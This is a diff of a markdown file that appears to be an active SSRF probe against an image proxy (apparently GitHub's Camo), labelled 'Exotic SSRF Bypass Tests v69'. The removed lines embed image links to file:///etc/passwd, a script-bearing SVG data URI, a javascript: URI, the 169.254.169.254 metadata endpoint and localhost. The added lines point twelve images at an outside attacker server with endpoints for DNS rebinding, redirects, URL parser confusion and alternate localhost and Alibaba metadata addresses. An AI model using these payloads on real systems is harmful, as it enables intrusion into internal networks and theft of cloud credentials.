@@ -1,29 +1,53 @@
-# URL Scheme Tests v68
+# Exotic SSRF Bypass Tests v69
 
-Testing various URL schemes to see what Camo accepts.
+Advanced bypass techniques from SSRF skill.
 
-## 1. file:// protocol
+## 1. 1u.ms DNS Rebinding Service
 
-![FileProto](file:///etc/passwd)
+![1ums](http://164.90.187.218.nip.io:9999/1ums?v=69)
 
-## 2. data: URI
+## 2. r3dir.me 307 Redirect Service
 
-![DataURI](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=)
+![r3dir](http://164.90.187.218.nip.io:9999/r3dir?v=69)
 
-## 3. javascript: URI (if somehow rendered)
+## 3. URL Parser Confusion (#@)
 
-![JSUri](javascript:alert(1))
+![URLConf1](http://164.90.187.218.nip.io:9999/urlconfuse1?v=69)
 
-## 4. Internal IP direct
+## 4. URL Parser Confusion (\@)
 
-![Internal](http://169.254.169.254/latest/meta-data/)
+![URLConf2](http://164.90.187.218.nip.io:9999/urlconfuse2?v=69)
 
-## 5. Localhost direct
+## 5. URL Parser Confusion (port\@)
 
-![Localhost](http://127.0.0.1/)
+![URLConf3](http://164.90.187.218.nip.io:9999/urlconfuse3?v=69)
 
-## 6. Control
+## 6. Space Injection
 
-![OK](http://164.90.187.218.nip.io:9999/ok?v=68)
+![SpaceInj](http://164.90.187.218.nip.io:9999/spaceinj?v=69)
 
-Timestamp: 2026-01-12T16:00:00Z
+## 7. Alternate Localhost (127.127.127.127)
+
+![AltLocal](http://164.90.187.218.nip.io:9999/localhost127?v=69)
+
+## 8. Zero IP (0.0.0.0)
+
+![ZeroIP](http://164.90.187.218.nip.io:9999/zeroip?v=69)
+
+## 9. Bare Zero (0)
+
+![BareZero](http://164.90.187.218.nip.io:9999/bareip?v=69)
+
+## 10. Short Localhost (127.1)
+
+![ShortLocal](http://164.90.187.218.nip.io:9999/shortlocalhost?v=69)
+
+## 11. Alibaba Metadata IP (100.100.100.200)
+
+![Alibaba](http://164.90.187.218.nip.io:9999/alibaba?v=69)
+
+## 12. Control (Valid GIF)
+
+![OK](http://164.90.187.218.nip.io:9999/ok?v=69)
+
+Timestamp: 2026-01-12T16:10:00Z
